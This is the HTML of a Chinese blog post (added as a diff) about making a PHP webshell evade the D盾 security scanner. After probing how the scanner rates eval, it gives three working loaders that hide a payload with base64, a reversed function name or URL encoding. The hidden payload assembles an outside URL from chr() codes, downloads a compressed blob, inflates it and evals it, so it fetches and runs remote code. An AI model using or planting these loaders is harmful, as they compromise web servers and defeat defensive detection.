@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="PHP大马过D盾 0x01 分析想要过D盾检测，必须要搞懂D盾的检测机制，据我了解D盾的检测机制是  不直接对eval封杀  根据eval中的值来判断级别  他有一套自己的木马库，如果你的木马符合，就直接报5级">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP大马过D盾">
+<meta property="og:url" content="http://yoursite.com/2019/02/05/PHP大马过D盾/index.html">
+<meta property="og:site_name" content="B1ok3n&#39;s Blog">
+<meta property="og:description" content="PHP大马过D盾 0x01 分析想要过D盾检测，必须要搞懂D盾的检测机制，据我了解D盾的检测机制是  不直接对eval封杀  根据eval中的值来判断级别  他有一套自己的木马库，如果你的木马符合，就直接报5级">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://b1ok3n-blog.oss-cn-hangzhou.aliyuncs.com/PHP%E5%A4%A7%E9%A9%AC%E8%BF%87D%E7%9B%BE/1547598106701.png">
+<meta property="og:image" content="https://broken-1255718444.cos.ap-shanghai.myqcloud.com/PHP%E5%A4%A7%E9%A9%AC%E8%BF%87D%E7%9B%BE/1547598197370.png">
+<meta property="og:image" content="https://broken-1255718444.cos.ap-shanghai.myqcloud.com/PHP%E5%A4%A7%E9%A9%AC%E8%BF%87D%E7%9B%BE/1547598276574.png">
+<meta property="og:image" content="https://broken-1255718444.cos.ap-shanghai.myqcloud.com/PHP%E5%A4%A7%E9%A9%AC%E8%BF%87D%E7%9B%BE/1547598895386.png">
+<meta property="og:image" content="https://broken-1255718444.cos.ap-shanghai.myqcloud.com/PHP%E5%A4%A7%E9%A9%AC%E8%BF%87D%E7%9B%BE/1547599279702.png">
+<meta property="og:image" content="https://broken-1255718444.cos.ap-shanghai.myqcloud.com/PHP%E5%A4%A7%E9%A9%AC%E8%BF%87D%E7%9B%BE/1547600166994.png">
+<meta property="og:updated_time" content="2019-02-10T13:49:41.344Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PHP大马过D盾">
+<meta name="twitter:description" content="PHP大马过D盾 0x01 分析想要过D盾检测，必须要搞懂D盾的检测机制，据我了解D盾的检测机制是  不直接对eval封杀  根据eval中的值来判断级别  他有一套自己的木马库，如果你的木马符合，就直接报5级">
+<meta name="twitter:image" content="http://b1ok3n-blog.oss-cn-hangzhou.aliyuncs.com/PHP%E5%A4%A7%E9%A9%AC%E8%BF%87D%E7%9B%BE/1547598106701.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/02/05/PHP大马过D盾/">
+
+
+
+
+
+  <title>PHP大马过D盾 | B1ok3n's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">B1ok3n's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/05/PHP大马过D盾/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="B1ok3n">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://b1ok3n-blog.oss-cn-hangzhou.aliyuncs.com/images/QQ%E5%9B%BE%E7%89%8720190205121702.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="B1ok3n's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">PHP大马过D盾</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-05T20:48:02+08:00">
+                2019-02-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/网络安全/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>PHP大马过D盾</p>
+<h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><p>想要过D盾检测，必须要搞懂D盾的检测机制，据我了解D盾的检测机制是</p>
+<ol>
+<li><p>不直接对<code>eval</code>封杀</p>
+</li>
+<li><p>根据<code>eval</code>中的值来判断级别</p>
+</li>
+<li><p>他有一套自己的木马库，如果你的木马符合，就直接报5级</p>
+</li>
+</ol>
+<a id="more"></a>
+<h2 id="0x02-测试"><a href="#0x02-测试" class="headerlink" title="0x02 测试"></a>0x02 测试</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>();</span><br></pre></td></tr></table></figure>
+<p><img src="http://b1ok3n-blog.oss-cn-hangzhou.aliyuncs.com/PHP%E5%A4%A7%E9%A9%AC%E8%BF%87D%E7%9B%BE/1547598106701.png" alt="1547598106701"></p>
+<p>即使用了<code>eval</code>它也并没有上报，因为<code>eval</code>中根本没值</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>($a);</span><br></pre></td></tr></table></figure>
+<p><img src="https://broken-1255718444.cos.ap-shanghai.myqcloud.com/PHP%E5%A4%A7%E9%A9%AC%E8%BF%87D%E7%9B%BE/1547598197370.png" alt="1547598197370"></p>
+<p>在<code>eval</code>中传入了<code>$a</code>，因为<code>$a</code>是未知的，所以他会上报</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"echo 'this is a test';"</span>;</span><br><span class="line"><span class="keyword">eval</span>($a);</span><br></pre></td></tr></table></figure>
+<p><img src="https://broken-1255718444.cos.ap-shanghai.myqcloud.com/PHP%E5%A4%A7%E9%A9%AC%E8%BF%87D%E7%9B%BE/1547598276574.png" alt="1547598276574"></p>
+<p>这里又没有上报了，因为<code>$a</code>中的内容是无害的</p>
+<h2 id="0x03-Bypass"><a href="#0x03-Bypass" class="headerlink" title="0x03 Bypass"></a>0x03 Bypass</h2><p>既然D盾检测的是<code>eval</code>中的值，那直接加密PHP大马，然后再解密</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$s=<span class="string">"JHBhc3N3b3JkPSdhZG1pbic7JGM9ImNociI7c2Vzc2lvbl9zdGFydCgpO2lmKGVtcHR5KCRfU0VTU0lPTlsnUGhwQ29kZSddKSl7JHVybD0kYygxMDQpLiRjKDExNikuJGMoMTE2KS4kYygxMTIpLiRjKDU4KS4kYyg0Nyk7JHVybC49JGMoNDcpLiRjKDEwNSkuJGMoNDYpLiRjKDExMCkuJGMoMTA1KS4kYygxMTcpOyR1cmwuPSRjKDExMikuJGMoMTA1KS4kYyg5OSkuJGMoNDYpLiRjKDk5KS4kYygxMTEpOyR1cmwuPSRjKDEwOSkuJGMoNDcpLiRjKDEwNSkuJGMoMTA5KS4kYyg5NykuJGMoMTAzKTskdXJsLj0kYygxMDEpLiRjKDExNSkuJGMoNDcpLiRjKDUwKS4kYyg0OCkuJGMoNDkpLiRjKDU1KTskdXJsLj0kYyg0NykuJGMoNDgpLiRjKDUzKS4kYyg0NykuJGMoNTApLiRjKDQ5KS4kYyg0Nyk7JHVybC49JGMoMTE4KS4kYyg0OSkuJGMoODEpLiRjKDgyKS4kYyg0OSkuJGMoNzcpLiRjKDQ2KS4kYygxMDMpLiRjKDEwNSkuJGMoMTAyKTskZ2V0PWNocigxMDIpLmNocigxMDUpLmNocigxMDgpLmNocigxMDEpLmNocig5NSk7JGdldC49Y2hyKDEwMykuY2hyKDEwMSkuY2hyKDExNikuY2hyKDk1KS5jaHIoOTkpOyRnZXQuPWNocigxMTEpLmNocigxMTApLmNocigxMTYpLmNocigxMDEpLmNocigxMTApOyRnZXQuPWNocigxMTYpLmNocigxMTUpOyRfU0VTU0lPTlsnUGhwQ29kZSddPSRnZXQoJHVybCk7fSR1bj0kYygxMDMpLiRjKDEyMikuJGMoMTA1KS4kYygxMTApOyR1bi49JGMoMTAyKS4kYygxMDgpLiRjKDk3KS4kYygxMTYpLiRjKGJhc2U2NF9kZWNvZGUoJ01UQXgnKSk7QGV2YWwoJHVuKCRfU0VTU0lPTlsnUGhwQ29kZSddKSk7"</span>;</span><br><span class="line">$z=base64_decode($s);</span><br><span class="line"><span class="keyword">eval</span>($z);</span><br></pre></td></tr></table></figure>
+<p><img src="https://broken-1255718444.cos.ap-shanghai.myqcloud.com/PHP%E5%A4%A7%E9%A9%AC%E8%BF%87D%E7%9B%BE/1547598895386.png" alt="1547598895386"></p>
+<p>看来D盾会识别<code>base64_decode</code></p>
+<p>那可以使用变量函数，把<code>base64_decode</code>通过一些转换之后赋值给一个变量(变量函数)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"EDocEd_46EsaB"</span>;</span><br><span class="line">$b=strrev($a);</span><br><span class="line">$s=<span class="string">"JHBhc3N3b3JkPSdhZG1pbic7JGM9ImNociI7c2Vzc2lvbl9zdGFydCgpO2lmKGVtcHR5KCRfU0VTU0lPTlsnUGhwQ29kZSddKSl7JHVybD0kYygxMDQpLiRjKDExNikuJGMoMTE2KS4kYygxMTIpLiRjKDU4KS4kYyg0Nyk7JHVybC49JGMoNDcpLiRjKDEwNSkuJGMoNDYpLiRjKDExMCkuJGMoMTA1KS4kYygxMTcpOyR1cmwuPSRjKDExMikuJGMoMTA1KS4kYyg5OSkuJGMoNDYpLiRjKDk5KS4kYygxMTEpOyR1cmwuPSRjKDEwOSkuJGMoNDcpLiRjKDEwNSkuJGMoMTA5KS4kYyg5NykuJGMoMTAzKTskdXJsLj0kYygxMDEpLiRjKDExNSkuJGMoNDcpLiRjKDUwKS4kYyg0OCkuJGMoNDkpLiRjKDU1KTskdXJsLj0kYyg0NykuJGMoNDgpLiRjKDUzKS4kYyg0NykuJGMoNTApLiRjKDQ5KS4kYyg0Nyk7JHVybC49JGMoMTE4KS4kYyg0OSkuJGMoODEpLiRjKDgyKS4kYyg0OSkuJGMoNzcpLiRjKDQ2KS4kYygxMDMpLiRjKDEwNSkuJGMoMTAyKTskZ2V0PWNocigxMDIpLmNocigxMDUpLmNocigxMDgpLmNocigxMDEpLmNocig5NSk7JGdldC49Y2hyKDEwMykuY2hyKDEwMSkuY2hyKDExNikuY2hyKDk1KS5jaHIoOTkpOyRnZXQuPWNocigxMTEpLmNocigxMTApLmNocigxMTYpLmNocigxMDEpLmNocigxMTApOyRnZXQuPWNocigxMTYpLmNocigxMTUpOyRfU0VTU0lPTlsnUGhwQ29kZSddPSRnZXQoJHVybCk7fSR1bj0kYygxMDMpLiRjKDEyMikuJGMoMTA1KS4kYygxMTApOyR1bi49JGMoMTAyKS4kYygxMDgpLiRjKDk3KS4kYygxMTYpLiRjKGJhc2U2NF9kZWNvZGUoJ01UQXgnKSk7QGV2YWwoJHVuKCRfU0VTU0lPTlsnUGhwQ29kZSddKSk7"</span>;</span><br><span class="line">$z=$b($s);</span><br><span class="line"><span class="keyword">eval</span>($z);</span><br></pre></td></tr></table></figure>
+<p><img src="https://broken-1255718444.cos.ap-shanghai.myqcloud.com/PHP%E5%A4%A7%E9%A9%AC%E8%BF%87D%E7%9B%BE/1547599279702.png" alt="1547599279702"></p>
+<p>另一种思路，既然D盾只对<code>eval</code>中的值进行检测，那直接在<code>eval</code>里面执行函数呢，把函数的返回值传给<code>eval</code>。这里D盾好像不会检测函数的返回值，所以就认为这是一个无害函数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $s=<span class="string">'%24password%3d%27admin%27%3b%24c%3d%22chr%22%3bsession_start()%3bif(empty(%24_SESSION%5b%27PhpCode%27%5d))%7b%24url%3d%24c(104).%24c(116).%24c(116).%24c(112).%24c(58).%24c(47)%3b%24url.%3d%24c(47).%24c(105).%24c(46).%24c(110).%24c(105).%24c(117)%3b%24url.%3d%24c(112).%24c(105).%24c(99).%24c(46).%24c(99).%24c(111)%3b%24url.%3d%24c(109).%24c(47).%24c(105).%24c(109).%24c(97).%24c(103)%3b%24url.%3d%24c(101).%24c(115).%24c(47).%24c(50).%24c(48).%24c(49).%24c(55)%3b%24url.%3d%24c(47).%24c(48).%24c(53).%24c(47).%24c(50).%24c(49).%24c(47)%3b%24url.%3d%24c(118).%24c(49).%24c(81).%24c(82).%24c(49).%24c(77).%24c(46).%24c(103).%24c(105).%24c(102)%3b%24get%3dchr(102).chr(105).chr(108).chr(101).chr(95)%3b%24get.%3dchr(103).chr(101).chr(116).chr(95).chr(99)%3b%24get.%3dchr(111).chr(110).chr(116).chr(101).chr(110)%3b%24get.%3dchr(116).chr(115)%3b%24_SESSION%5b%27PhpCode%27%5d%3d%24get(%24url)%3b%7d%24un%3d%24c(103).%24c(122).%24c(105).%24c(110)%3b%24un.%3d%24c(102).%24c(108).%24c(97).%24c(116).%24c(base64_decode(%27MTAx%27))%3b%40eval(%24un(%24_SESSION%5b%27PhpCode%27%5d))%3b'</span>;</span><br><span class="line">	<span class="keyword">return</span> urldecode($s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(f());</span><br></pre></td></tr></table></figure>
+<p><img src="https://broken-1255718444.cos.ap-shanghai.myqcloud.com/PHP%E5%A4%A7%E9%A9%AC%E8%BF%87D%E7%9B%BE/1547600166994.png" alt="1547600166994"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/02/05/Python-多任务/" rel="next" title="Python-多任务">
+                <i class="fa fa-chevron-left"></i> Python-多任务
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/02/10/文件包含漏洞/" rel="prev" title="文件包含漏洞">
+                文件包含漏洞 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="http://b1ok3n-blog.oss-cn-hangzhou.aliyuncs.com/images/QQ%E5%9B%BE%E7%89%8720190205121702.jpg" alt="B1ok3n">
+            
+              <p class="site-author-name" itemprop="name">B1ok3n</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-分析"><span class="nav-number">1.</span> <span class="nav-text">0x01 分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-测试"><span class="nav-number">2.</span> <span class="nav-text">0x02 测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Bypass"><span class="nav-number">3.</span> <span class="nav-text">0x03 Bypass</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">B1ok3n</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":120,"height":240},"mobile":{"show":true},"log":false,"tagMode":false});</script></body>
+</html>
